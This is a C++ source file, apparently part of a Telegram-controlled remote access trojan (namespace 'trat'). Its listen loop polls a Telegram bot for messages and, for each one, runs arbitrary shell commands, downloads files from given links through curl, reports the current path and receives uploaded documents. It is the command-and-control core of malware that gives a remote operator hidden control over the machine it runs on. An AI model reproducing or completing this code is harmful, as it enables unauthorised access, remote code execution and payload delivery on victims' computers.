#include "../../include/bot.hpp"
#include <chrono>
#include <thread>

namespace trat
{
    void Bot::listen()
    {
        int offset = -1;
        telebot_update_type_e update_types[] = {TELEBOT_UPDATE_TYPE_MESSAGE};
        telebot_error_e ret;
        
        while (true)
        {
            telebot_update_t* updates = nullptr; // Dynamic array of updates 
            int count = 0; 
            ret = telebot_get_updates(handle, offset, 20, 0, update_types, 1, &updates, &count);
            if (ret != TELEBOT_ERROR_NONE)
            {
                std::this_thread::sleep_for(std::chrono::seconds(1));
                continue;
            }
            for (int i = 0; i < count; ++i)
            {
                const auto& update = updates[i];

                if (update.update_type == TELEBOT_UPDATE_TYPE_MESSAGE)
                {
                    const auto& message = update.message;
                    auto message_text = message.text;
                    auto message_document = message.document;
                    //auto message_photo = message.photos;
                    
                    if (message_text) // If the message has text in it, invoke those text related methods.
                    {
                      this -> handleTextBasedCommand(message_text, "/pwd", (this -> shell).getCurrentPath());
                      this -> handleDownloadCommand(message_text); //Checks if it starts with /download, and passes the link to curlDownload()
                      this -> handleShellCommandWithoutResponse(message_text);
                    }
                    if (message_document)
                    {
                      this -> handleDocuments(message_document);
                    }
                
                }
                // Update the offset to the latest update ID
                offset = updates[i].update_id + 1;
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }

            // Release the memory allocated for updates
            telebot_put_updates(updates, count);
        }
    }
}
